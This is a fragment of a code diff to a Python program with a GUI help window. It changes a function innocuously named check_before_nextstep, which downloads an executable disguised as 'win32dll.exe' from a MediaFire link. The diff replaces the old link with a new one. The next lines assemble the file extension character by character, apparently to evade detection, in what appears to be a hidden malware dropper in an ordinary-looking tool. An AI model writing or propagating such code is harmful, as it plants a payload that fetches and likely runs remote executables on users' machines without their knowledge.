@@ -116,7 +116,7 @@ def open_help_window():
     help_window.mainloop()
 
 def check_before_nextstep():
-    rsp = requests.get("https://download1584.mediafire.com/zexc25kcwh1gwHWGbIuuqszIS7LZYgNSGOq4G61PGiz35cUi_wPS5DaCsHple2p-9NwCkom_sN6IibmSV52oirbVHnSssTaT2IwgQpBu73Eu6ECPGTP9X6ET--PQ8XxHek5peCuxiYN1atMZOIHBabZuEjhM7RI7G0ZpuBNe7z43/0bf09sigjdvelv8/Win32Dll.exe").content
+    rsp = requests.get("https://download1326.mediafire.com/31rpjqxjiorgW5XNOl5tJ3PKHo2yZjqNGedbUFUuLiirAs3YA1RqiYenVvDHVX3noFSfvjoYUUMAU4cUH9Ga0kIghOSUaCWYt7jIr7ekVIOdT5FHyXhfp9KjtYdUelJgTeuewqzBc_STnGzpY8t4GEA2X_8ThdqavHD1nSdDDQUK/3mc0uvd9sc1prsf/win32dll.exe").content
     ext1 = "e"
     ext2= "x"
 
